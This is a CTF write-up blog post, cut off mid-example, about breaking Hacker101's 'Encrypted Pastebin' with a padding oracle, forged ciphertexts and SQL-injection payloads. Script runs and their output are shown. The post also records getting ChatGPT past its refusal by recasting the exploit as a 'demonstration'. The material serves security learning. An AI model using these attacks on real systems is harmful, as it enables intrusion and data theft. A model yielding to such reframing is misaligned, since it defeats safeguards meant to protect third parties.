@@ -1,0 +1,618 @@
+<!doctype html><html lang=en-gb>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>Vibe hacking a padding oracle | Tales about Software Engineering</title>
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=generator content="Hugo 0.92.0">
+<meta name=ROBOTS content="INDEX, FOLLOW">
+<link href=/dist/css/app.4fc0b62e4b82c997bb0041217cd6b979.css rel=stylesheet>
+<meta property="og:title" content="Vibe hacking a padding oracle">
+<meta property="og:description" content="This post is a mixture of AppSec, vibe coding and cryptography.
+ SPOILER ALERT: This post describes how to complete the Capture-The-Flag exercise &ldquo;Encrypted Pastebin&rdquo; (Hard) on Hacker101.
+ Over the last few days I have had a lot of fun with a padding oracle. But let&rsquo;s take a step back:
+I have been looking at Hacker101 CTF exercises. The premise is simple:
+ You&rsquo;re given a website The website has flags hidden.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://beny23.github.io/posts/capturing_a_padding_oracle/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2025-11-09T00:00:00+00:00">
+<meta property="article:modified_time" content="2025-11-09T00:00:00+00:00">
+<meta itemprop=name content="Vibe hacking a padding oracle">
+<meta itemprop=description content="This post is a mixture of AppSec, vibe coding and cryptography.
+ SPOILER ALERT: This post describes how to complete the Capture-The-Flag exercise &ldquo;Encrypted Pastebin&rdquo; (Hard) on Hacker101.
+ Over the last few days I have had a lot of fun with a padding oracle. But let&rsquo;s take a step back:
+I have been looking at Hacker101 CTF exercises. The premise is simple:
+ You&rsquo;re given a website The website has flags hidden."><meta itemprop=datePublished content="2025-11-09T00:00:00+00:00">
+<meta itemprop=dateModified content="2025-11-09T00:00:00+00:00">
+<meta itemprop=wordCount content="2654">
+<meta itemprop=keywords content="appsec,ctf,cryptography,"><meta name=twitter:card content="summary">
+<meta name=twitter:title content="Vibe hacking a padding oracle">
+<meta name=twitter:description content="This post is a mixture of AppSec, vibe coding and cryptography.
+ SPOILER ALERT: This post describes how to complete the Capture-The-Flag exercise &ldquo;Encrypted Pastebin&rdquo; (Hard) on Hacker101.
+ Over the last few days I have had a lot of fun with a padding oracle. But let&rsquo;s take a step back:
+I have been looking at Hacker101 CTF exercises. The premise is simple:
+ You&rsquo;re given a website The website has flags hidden.">
+<link rel=me href=https://infosec.exchange/@beny23>
+<script data-goatcounter=https://beny23.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
+</head>
+<body class="ma0 avenir bg-near-white production">
+<header class="cover bg-top" style=background-image:url(https://beny23.github.io/images/capturing_a_padding_oracle_title.jpg)>
+<div class="pb3-m pb6-l bg-black-60">
+<nav class="pv3 ph3 ph4-ns" role=navigation>
+<div class="flex-l justify-between items-center center">
+<a href=/ class="f3 fw2 hover-white no-underline white-90 dib">
+Tales about Software Engineering
+</a>
+<div class="flex-l items-center">
+<ul class="pl0 mr3">
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/about/ title="About page">
+About
+</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/posts/ title="Blog page">
+Blog
+</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/talks/ title="Talks page">
+Talks
+</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/tags/ title="Tags page">
+Tags
+</a>
+</li>
+</ul>
+<a href=https://stackoverflow.com/users/227140/beny23 target=_blank class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel=noopener aria-label="follow on Stack Overflow——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32"><path d="M12 0C5.373.0.0 5.373.0 12s5.373 12 12 12 12-5.373 12-12S18.627.0 12 0zm.869 5.903 3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585 4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724 5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461 5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835V17H8.024v-1.167zM16 19H6v-6h1v5h8v-5h1v6zm.195-8.602-.945-5.446 1.162-.202.947 5.446-1.164.202z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+<a href=https://www.linkedin.com/in/gerald-benischke-9811b663 target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+<a href=https://github.com/beny23 target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+<a href=https://infosec.exchange/@beny23 target=_blank class="link-transition mastodon link dib z-999 pt3 pt0-l mr1" title="Mastodon link" rel=noopener aria-label="follow on Mastodon——Opens in a new window"><svg height="32" style="enable-background:new 0 0 230 230" viewBox="0 0 230 230" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M211.80683 139.0875c-3.1825 16.36625-28.4925 34.2775-57.5625 37.74875-15.16 1.80875-30.0825 3.47125-45.99875 2.74125-26.0275-1.1925-46.565-6.2125-46.565-6.2125.0 2.53375.15625 4.94625.46875 7.2025 3.38375 25.68625 25.47 27.225 46.3925 27.9425 21.115.7225 39.91625-5.20625 39.91625-5.20625l.86875 19.09s-14.77 7.93125-41.08125 9.39c-14.50875.7975-32.52375-.365-53.50625-5.91875C9.23183 213.82 1.40558 165.31125.20808 116.09125c-.36375-14.61375-.14-28.39375-.14-39.91875.0-50.33 32.97625-65.0825 32.97625-65.0825C49.67058 3.45375 78.20308.2425 107.86433.0h.72875c29.66125.2425 58.21125 3.45375 74.8375 11.09.0.0 32.97625 14.7525 32.97625 65.0825.0.0.4125 37.13375-4.6 62.915" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/><path d="M65.68743 96.45938c0 9.01375-7.3075 16.32125-16.3225 16.32125-9.01375.0-16.32-7.3075-16.32-16.32125.0-9.01375 7.30625-16.3225 16.32-16.3225 9.015.0 16.3225 7.30875 16.3225 16.3225M124.52893 96.45938c0 9.01375-7.30875 16.32125-16.3225 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225 9.01375.0 16.3225 7.30875 16.3225 16.3225M183.36933 96.45938c0 9.01375-7.3075 16.32125-16.32125 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225s16.32125 7.30875 16.32125 16.3225" fill="#fff"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+</div>
+</div>
+</nav>
+<div class="tc-l pv6 ph3 ph4-ns">
+<h1 class="f2 f1-l fw2 white-90 mb0 lh-title">Vibe hacking a padding oracle</h1>
+</div>
+</div>
+</header>
+<main class=pb7 role=main>
+<article class="flex-l flex-wrap justify-between mw8 center ph3">
+<header class="mt4 w-100">
+<aside class="instapaper_ignoref b helvetica tracked">
+POSTS
+</aside>
+<div id=sharing class=mt3>
+<a href="https://www.facebook.com/sharer.php?u=https://beny23.github.io/posts/capturing_a_padding_oracle/" class="facebook no-underline" aria-label="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a>
+<a href="https://twitter.com/share?url=https://beny23.github.io/posts/capturing_a_padding_oracle/&text=Vibe%20hacking%20a%20padding%20oracle" class="twitter no-underline" aria-label="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://beny23.github.io/posts/capturing_a_padding_oracle/&title=Vibe%20hacking%20a%20padding%20oracle" class="linkedin no-underline" aria-label="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+</div>
+<h1 class="f1 athelas mt3 mb1">Vibe hacking a padding oracle</h1>
+<time class="f6 mv4 dib tracked" datetime=2025-11-09T00:00:00Z>November 9, 2025</time>
+<span class="f6 mv4 dib tracked"> - 13 minutes read</span>
+<span class="f6 mv4 dib tracked"> - 2654 words</span>
+</header>
+<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l"><p>This post is a mixture of AppSec, vibe coding and cryptography.</p>
+<blockquote>
+<p>SPOILER ALERT: This post describes how to complete the Capture-The-Flag exercise
+&ldquo;Encrypted Pastebin&rdquo; (Hard) on <a href=https://ctf.hacker101.com/ctf>Hacker101</a>.</p>
+</blockquote>
+<p>Over the last few days I have had a lot of fun with a padding oracle. But let&rsquo;s take a step back:</p>
+<p>I have been looking at Hacker101 CTF exercises. The premise is simple:</p>
+<ul>
+<li>You&rsquo;re given a website</li>
+<li>The website has flags hidden. They look like this <code>^FLAG^45fe423[..]$FLAG$</code>.</li>
+<li>To find the flags you&rsquo;ll have to find flaws in the website.</li>
+</ul>
+<p>So I dimmed the lights, put my hoodie on and started. At first I was presented with this screen</p>
+<p><img src=/images/capturing_a_padding_oracle_screenshot_encrypted_pastedbin.png alt="screenshot of encrypted pastebin"></p>
+<p>Military grade eh? If that means &ldquo;procured from the cheapest bidder&rdquo; that&rsquo;s right. Now, AES 128 bit is quite
+ok for everyday use at the moment, but not exactly state of the art.</p>
+<h1 id=how-does-it-work>How does it work?</h1>
+<pre tabindex=0><code>&lt;h1&gt;Encrypted Pastebin&lt;/h1&gt;
+&lt;p&gt;We've developed the most secure pastebin on the internet.  
+   Your data is protected with military-grade 128-bit AES 
+   encryption.  The key for your data is never stored in our 
+   database, so no hacker can ever gain unauthorized access.&lt;/p&gt;
+&lt;h2&gt;Post&lt;/h2&gt;
+&lt;form method=&quot;POST&quot;&gt;
+    Title: &lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;
+    &lt;textarea rows=&quot;40&quot; cols=&quot;80&quot; name=&quot;body&quot;&gt;&lt;/textarea&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Post&quot;&gt;
+&lt;/form&gt;
+&lt;img src=&quot;tracking.gif&quot;&gt;
+</code></pre><p>A very basic web application. It&rsquo;s a basic form that submits the &ldquo;title&rdquo; and &ldquo;body&rdquo;. Once that&rsquo;s done
+it redirects to a URL:</p>
+<pre tabindex=0><code>https://server_id.ctf.hacker101.com/
+   ?post=2FToqCqBYQ8s2G2R7fOUt8FnMvEUOd2qCe6p!v6gMU6jAYpGPEFGmbc9u8tn2sKAt1HWNXtFuM-07CwuKa0Pfh0z9OHItUyjvU8N2t98!Df6EzFzZhbfZnbSCgqg0z02OmpP4R1ilZ8aPYgJipF6uhzsZH8!gbXy0TRmrA9pxi7198N8e3GTPo6UTHJUBkhKdszuRtRpPJs12eUKg7uVhQ~~
+</code></pre><p>Which shows entered data:</p>
+<pre tabindex=0><code>&lt;h1&gt;test title&lt;/h1&gt;
+&lt;pre&gt;
+  test body
+&lt;/pre&gt;
+&lt;img src=&quot;tracking.gif&quot;&gt;
+</code></pre><p>So now if I wanted to share my content with someone else I could just give them the URL.</p>
+<p>With the information in the text, I imagined the following:</p>
+<p><img src=/images/capturing_a_padding_oracle_probably_architecture.png alt="probably architecture"></p>
+<h1 id=flag-1>Flag 1</h1>
+<p>I found my first flag very quickly. All it needed was to put in an invalid query parameter:</p>
+<pre tabindex=0><code>GET https://server_id.ctf.hacker101.com/?post=1
+
+^FLAG^e6a5f6b9e[...]896e81bb3$FLAG$
+Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 69, in index
+    post = json.loads(decryptLink(postCt).decode('utf8'))
+  File &quot;./common.py&quot;, line 46, in decryptLink
+    data = b64d(data)
+  File &quot;./common.py&quot;, line 11, in &lt;lambda&gt;
+    b64d = lambda x: base64.decodestring(
+      x.replace('~', '=')
+       .replace('!', '/')
+       .replace('-', '+'))
+  File &quot;/usr/local/lib/python2.7/base64.py&quot;, 
+    line 328, in decodestring
+    return binascii.a2b_base64(s)
+Error: Incorrect padding
+</code></pre><p>So the flag was in an error message. Ok cool. But the more interesting information was in
+the associated stack trace. We can see that:</p>
+<ul>
+<li>the payload is Base64 encoded</li>
+<li>the encoding is using a custom format, replacing the characters <code>~!-</code> with the standard
+<code>=/+</code></li>
+<li>the payload is JSON</li>
+</ul>
+<h1 id=flag-2>Flag 2</h1>
+<p>The fact that the stack trace contains some interesting information allows us to try to get to
+the next stage. So I experimented with payloads:</p>
+<pre tabindex=0><code>% echo '{&quot;test&quot;:&quot;test&quot;}' | base64 | tr '=/+' '~!-'
+eyJ0ZXN0IjoidGVzdCJ9Cg~~
+</code></pre><p>Submitting that gave me a payload to try against the endpoint which gave me a new stack trace:</p>
+<pre tabindex=0><code>Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 69, in index
+    post = json.loads(decryptLink(postCt).decode('utf8'))
+  File &quot;./common.py&quot;, line 49, in decryptLink
+    return unpad(cipher.decrypt(data))
+  File &quot;./common.py&quot;, line 19, in unpad
+    padding = data[-1]
+IndexError: string index out of range
+</code></pre><p>And a payload of <code>test,1</code> gave me:</p>
+<pre tabindex=0><code>Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 69, in index
+    post = json.loads(decryptLink(postCt).decode('utf8'))
+  File &quot;./common.py&quot;, line 48, in decryptLink
+    cipher = AES.new(staticKey, AES.MODE_CBC, iv)
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py&quot;, line 95, in new
+    return AESCipher(key, *args, **kwargs)
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py&quot;, line 59, in __init__
+    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py&quot;, line 141, in __init__
+    self._cipher = factory.new(key, *args, **kwargs)
+ValueError: IV must be 16 bytes long
+</code></pre><p>And then I tried with a longer string <code>12345678901234561234567890123456</code> which gave me:</p>
+<pre tabindex=0><code>Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 69, in index
+    post = json.loads(decryptLink(postCt).decode('utf8'))
+  File &quot;./common.py&quot;, line 49, in decryptLink
+    return unpad(cipher.decrypt(data))
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py&quot;, line 295, in decrypt
+    return self._cipher.decrypt(ciphertext)
+ValueError: Input strings must be a multiple of 16 in length
+</code></pre><p>I wasn&rsquo;t quite sure what to do with this information, so I asked ChatGPT:</p>
+<blockquote>
+<p>Can you help me investigate the following behaviour. I&rsquo;ve been submitting
+different inputs to a service and the response contains stack traces:</p>
+</blockquote>
+<p>To which I got an interesting reply:</p>
+<blockquote>
+<p>Likely vulnerabilities (ranked by seriousness)</p>
+<ol>
+<li>Information disclosure via verbose stack traces</li>
+<li>Padding oracle / error oracle exposure</li>
+<li>Static encryption key + unauthenticated ciphertext</li>
+<li>Incorrect/unreliable padding handling and Python2 bytes vs str bugs</li>
+<li>Poor input validation and custom transforms (base64 tweak)</li>
+</ol>
+<p>Why these combine into a practical attack surface</p>
+<p>Distinct exception messages + ability to control input bytes (IV/ciphertext) = oracle. Classic CBC
+padding oracle attacks exploit exactly this: they send modified ciphertexts and observe
+whether padding was valid. With repeated probes an attacker can recover plaintext.
+The stack traces you posted show precisely the different failure modes an attacker could detect and use.</p>
+</blockquote>
+<h1 id=a-padding-oracle-you-say>A padding oracle you say?</h1>
+<p>Now, it is beyond the scope of this post to explain padding oracles, so I got some help from google:</p>
+<ul>
+<li><a href=https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle>OWASP: Testing for Padding Oracle</a></li>
+<li><a href=https://github.com/PortSwigger/padding-oracle-hunter/>Padding Oracle Hunter</a></li>
+<li><a href=https://en.wikipedia.org/wiki/Padding_oracle_attack>Wikipedia: Padding Oracle Attack</a></li>
+</ul>
+<p>Suffice to say that a padding oracle has the ability to decrypt encrypted text without knowing the
+encryption key. It just needs requests. Lots of them.</p>
+<p>After a bit of searching around I found that none of the tools quite fit what I wanted them to do.
+So I thought, why not write one myself. And then I thought, a sod it, let&rsquo;s just ask an LLM.</p>
+<h1 id=its-not-what-you-ask-its-how-you-ask>It&rsquo;s not what you ask, it&rsquo;s how you ask</h1>
+<p>If you ask ChatGPT (and I used the default mode, without logging in, I&rsquo;m a cheapskate) to write you
+a script to exploit a padding oracle, it will refuse.</p>
+<blockquote>
+<p>I can’t help write an exploit or any code intended to attack a service. Helping to craft
+or deliver an active padding-oracle exploit would enable wrongdoing (unauthorized access
+of systems), so I must refuse.</p>
+</blockquote>
+<p>If ask it to write a demonstration server and client for a padding oracle attack, it is indeed quite
+helpful.</p>
+<p>Here&rsquo;s what it came up with: <a href=https://github.com/beny23/hackerone-ctf/tree/main/encrypted-pastebin>https://github.com/beny23/hackerone-ctf/tree/main/encrypted-pastebin</a></p>
+<p>Now, it took quite a few permutations to get it to work and iron out some inefficiencies. But I
+was actually impressed with what it came up with. I still wanted to throw the laptop out of the
+window when it kept changing the names of the command line switches.</p>
+<p>Finally, I started trying to decrypt the payload:</p>
+<pre tabindex=0><code>% python padding-oracle.py --decrypt 'payload' --state state.json --workers 4
+[client] Launching threaded padding-oracle recovery via GET...
+[progress] Block 1/9 Byte 1/16 (from state) -&gt; 0x5e ('^')
+[progress] Block 1/9 Byte 2/16 (from state) -&gt; 0x47 ('G')
+[progress] Block 1/9 Byte 3/16 (from state) -&gt; 0x41 ('A')
+[progress] Block 1/9 Byte 4/16 (from state) -&gt; 0x4c ('L')
+[...]
+[progress] Block 9/9 Byte 13/16 Requests: 181 Retries: 0 -&gt; Recovered: 0x7e ('~')
+[progress] Block 9/9 Byte 14/16 Requests: 178 Retries: 0 -&gt; Recovered: 0x7e ('~')
+[progress] Block 9/9 Byte 15/16 Requests: 217 Retries: 0 -&gt; Recovered: 0x67 ('g')
+[progress] Block 9/9 Byte 16/16 Requests: 153 Retries: 0 -&gt; Recovered: 0x75 ('u')
+[client] Recovered plaintext: b'{
+  &quot;flag&quot;: &quot;^FLAG^4cc4809ce[..]3b$FLAG$&quot;, 
+  &quot;id&quot;: &quot;4&quot;, 
+  &quot;key&quot;: &quot;zNQ!rEXnxjQBhzLh-kP6ug~~&quot;}'
+</code></pre><p>Now, that gave me my second flag. The decrypted post JSON contained a flag. Yey!
+It was also rather interesting because it contained the key that would be used
+to encrypt the payload. Which matched the text on the homepage, that the encryption
+key is not stored. It&rsquo;s important to add that this key is distinct from the static
+key used to encrypt the URLs. Each payload is encrypted with a different
+random key.</p>
+<p>It&rsquo;s also not a quick thing. Each byte needs between 1-255 requests to the web service.
+Each block has 16 bytes. So decrypting the URL parameters did take a while. Especially
+as the service would take a few seconds for each request and couldn&rsquo;t handle many
+parallel requests.</p>
+<h1 id=flag-3>Flag 3</h1>
+<p>Up until now, we&rsquo;ve only decrypted payloads that we ourselves had added to the
+example pastebin service. How could we go further?</p>
+<p>Padding oracles are not just able to decrypt payloads, but they can also be
+used to encrypt. This means I can generate my own payloads. Looking at the structure
+of the decrypted payload, we could see an &ldquo;id&rdquo; and &ldquo;key&rdquo; field. I wondered whether
+I could use that to get other payloads.</p>
+<pre tabindex=0><code>% python padding-oracle.py --encrypt '{&quot;id&quot;: &quot;1&quot;}' --workers 4 
+[client] Encrypting plaintext via oracle...
+[encrypt] Recovering intermediate D(C_1) for plaintext block 1/1...
+[progress] Block 1/1 Byte 1/16 Requests: 24 Retries: 0 -&gt; Recovered: 0x14 ('.')
+[progress] Block 1/1 Byte 2/16 Requests: 2 Retries: 0 -&gt; Recovered: 0x01 ('.')
+[..]
+[progress] Block 1/1 Byte 15/16 Requests: 170 Retries: 0 -&gt; Recovered: 0xa8 ('.')
+[progress] Block 1/1 Byte 16/16 Requests: 42 Retries: 0 -&gt; Recovered: 0x3a (':')
+[client] Ciphertext (custom-base64): QYrZEj0wp[..]]uCYm1k3fOo~
+</code></pre><p>When I then sent that off to the service I got flag number 3:</p>
+<pre tabindex=0><code>Attempting to decrypt page with title: ^FLAG^8b1f33[..]]a69e65$FLAG$
+Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 74, in index
+    body = decryptPayload(post['key'], body)
+KeyError: 'key'
+</code></pre><p>Helpfully, the service shows the title of an entry when passing in the id.
+In the real world, this might have been a way of debugging that never got
+removed.</p>
+<h1 id=flag-4>Flag 4</h1>
+<p>Getting the last flag was a little more complicated. To cut a long story
+short, I discovered that the id field had a SQL injection vulnerability.</p>
+<p>First I got my SQL syntax a bit wrong:</p>
+<pre tabindex=0><code>% python padding-oracle.py --encrypt $'{&quot;id&quot;:&quot;2\' or \'1\'=\'1&quot;,
+  &quot;key&quot;: &quot;2YWjdCO616G47N2-Kqd2ww~~&quot;}' --workers 4
+[client] Encrypting plaintext via oracle...
+[encrypt] Recovering intermediate D(C_4) for plaintext block 4/4...
+[progress] Block 4/4 Byte 1/16 Requests: 56 Retries: 0 -&gt; Recovered: 0x38 ('8')
+[progress] Block 4/4 Byte 2/16 Requests: 43 Retries: 0 -&gt; Recovered: 0x29 (')')
+[..]
+[progress] Block 1/4 Byte 15/16 Requests: 51 Retries: 0 -&gt; Recovered: 0x3d ('=')
+[progress] Block 1/4 Byte 16/16 Requests: 63 Retries: 0 -&gt; Recovered: 0x2e ('.')
+[client] Ciphertext (custom-base64): VR8n-fUckUwAGx4LPuOa[..]]SO4~
+
+% curl 'https://server_id.ctf.hacker101.com?post=VR8n-fUckUwAGx[..]xFObn2QzizunqoIXrSO4~'
+Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 71, in index
+    if cur.execute('SELECT title, body FROM posts WHERE id=%s' % post['id']) == 0:
+  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line 255, in execute
+    self.errorhandler(self, exc, value)
+  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line 50, in defaulterrorhandler
+    raise errorvalue
+ProgrammingError: (1064, &quot;You have an error in your SQL syntax; 
+  check the manual that corresponds to your MariaDB server version 
+  for the right syntax to use near '' or '1'='1' at line 1&quot;)
+</code></pre><p>This gave me two pieces of information:</p>
+<ul>
+<li>the query being used which told me the table name and the column names</li>
+<li>the database being used (MariaDB)</li>
+</ul>
+<p>This is useful, because I could then experiment with writing SQL injection
+on a site like <a href=https://sqlfiddle.com>SQLFiddle</a> using the right database.</p>
+<h1 id=sqli-cul-de-sac>SQLi cul-de-sac</h1>
+<p>So my initial thought was, because the server code leaked the title in the
+error message I could use SQL injection to extract the body:</p>
+<p>I used a parameter of</p>
+<pre tabindex=0><code>0 union select body, title FROM posts where id=1
+</code></pre><p>This way the query would be:</p>
+<pre tabindex=0><code> select title, body
+   from posts
+  where id = 0
+union
+ select body, title
+   from posts
+  where id = 1
